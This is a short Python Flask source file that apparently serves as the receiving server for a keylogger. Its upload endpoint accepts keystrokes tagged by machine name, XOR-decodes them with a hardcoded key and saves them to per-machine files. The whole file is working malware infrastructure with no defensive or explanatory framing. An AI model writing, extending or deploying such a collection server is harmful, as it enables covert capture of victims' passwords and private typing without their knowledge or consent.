from flask import Flask, request, jsonify
import file_time
import encryptor

app = Flask(__name__)

@app.route('/api/upload', methods=['POST'])
def upload():
    content = request.json
    machine = content.get("machine_name")
    encrypted_data = content.get("keystrokes")

    if not machine or not encrypted_data:
        return jsonify({"error": "Missing data"}), 400

    en = encryptor.Encryptor("mysecretkey")
    print(en.xor_encrypt(encrypted_data))
    file_time.file_writer(machine, encrypted_data)
    return jsonify({"status": "success"}), 200

if __name__ == '__main__':
    app.run(port=5000)

